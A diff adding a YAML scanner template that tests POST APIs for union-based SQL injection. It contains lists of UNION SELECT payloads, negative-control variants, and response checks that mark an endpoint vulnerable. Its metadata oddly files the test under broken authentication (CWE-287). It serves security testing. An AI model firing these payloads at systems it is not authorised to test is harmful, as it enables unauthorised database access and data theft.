@@ -1,0 +1,200 @@
+id: UNION_DATA_TYPE_BASED_SQLI_POST
+info:
+  name: "Union based SQL Injection test with data type variations on POST method APIs"
+  description: "Union based SQL Injection test with data type variations on POST method APIs involves manipulating the SQL query to test how different data types (such as integers, strings, or dates) can affect the response from the server. By injecting payloads with varying data types into POST method APIs, attackers aim to identify weaknesses in the application’s input validation and the database's handling of diverse data formats. This technique can help uncover SQL injection vulnerabilities that might be overlooked in standard testing. Successfully exploiting this vulnerability can lead to unauthorized data retrieval, manipulation, or execution of arbitrary SQL commands."
+  details: "Union based SQL Injection test with data type variations on POST method APIs focuses on injecting different types of data, such as integers, strings, or booleans, into SQL queries via the POST method API. The objective is to identify how the backend database processes and handles these varying data types, potentially exposing flaws in input validation or query construction. This test helps uncover SQL injection vulnerabilities that could be exploited by attackers to bypass security measures, manipulate database queries, or extract sensitive information. By altering the data type, the test explores how the database might handle unexpected input, highlighting potential points of exploitation."
+  impact: "The impact of a successful Union based SQL Injection test with data type variations on POST method APIs can be severe, allowing attackers to bypass input validation mechanisms and manipulate database queries. This could lead to unauthorized access to sensitive data, such as user credentials, financial information, or personal details. Additionally, attackers may gain the ability to execute arbitrary SQL commands, potentially resulting in data corruption, privilege escalation, or system compromise. In extreme cases, this vulnerability could enable attackers to fully compromise the backend database and the application."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: UNION_DATA_TYPE_BASED_SQLI_POST
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+
+api_selection_filters:
+  method:
+    eq: "POST"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+
+  request_payload:
+    for_one:
+      key:
+        regex: ".*"
+        extract: userKey
+      value:
+        extract: userVal
+wordLists:
+  unionBasedPayloads:
+    - "' UNION SELECT 'a', 'b'--"
+    - "' UNION SELECT 1, 'a'--"
+    - "' UNION SELECT 'a', 1--"
+    - "' UNION SELECT 1, null--"
+    - "' UNION SELECT null, 'a'--"
+    - "' UNION SELECT 'a', null--"
+    - "' UNION SELECT 1, 'a', 'b'--"
+    - "' UNION SELECT 'a', 'b', 'c'--"
+    - "' UNION SELECT 1, 2, 'a'--"
+    - "' UNION SELECT null, 1, 'a'--"
+    - "' UNION SELECT 'a', null, 1--"
+    - "' UNION SELECT 1, null, null--"
+    - "' UNION SELECT null, 'a', null--"
+    - "' UNION SELECT null, null, 'a'--"
+  unionBasedNegativePayloads:
+    - "' UNION SELECT 'a', 'b' WHERE 1=0 --"
+    - "' UNION SELECT 1, 'a' WHERE 1=0 --"
+    - "' UNION SELECT 'a', 1 WHERE 1=0 --"
+    - "' UNION SELECT 1, null WHERE 1=0 --"
+    - "' UNION SELECT null, 'a' WHERE 1=0 --"
+    - "' UNION SELECT 'a', null WHERE 1=0 --"
+    - "' UNION SELECT 1, 'a', 'b' WHERE 1=0 --"
+    - "' UNION SELECT 'a', 'b', 'c' WHERE 1=0 --"
+    - "' UNION SELECT 1, 2, 'a' WHERE 1=0 --"
+    - "' UNION SELECT null, 1, 'a' WHERE 1=0 --"
+    - "' UNION SELECT 'a', null, 1 WHERE 1=0 --"
+    - "' UNION SELECT 1, null, null WHERE 1=0 --"
+    - "' UNION SELECT null, 'a', null WHERE 1=0 --"
+    - "' UNION SELECT null, null, 'a' WHERE 1=0 --"
+ 
+execute:
+  type: multiple
+  requests:
+  - req:
+    - modify_body_param:
+        userKey: ${userVal}${unionBasedPayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          not_contains:
+            - Error
+            - Internal Server 
+            - Fail
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked
+            - " UNION SELECT "
+            - <html>
+            - </html>
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_body_param:
+        userKey: ${userVal}${unionBasedNegativePayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0  
+          not_contains:
+            - Error
+            - Internal Server 
+            - Fail
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked
+            - " UNION SELECT "   
+            - <html>
+            - </html> 
+          neq: "${x1.response.body}"
+    - success: vulnerable
+        
+
+   
+  
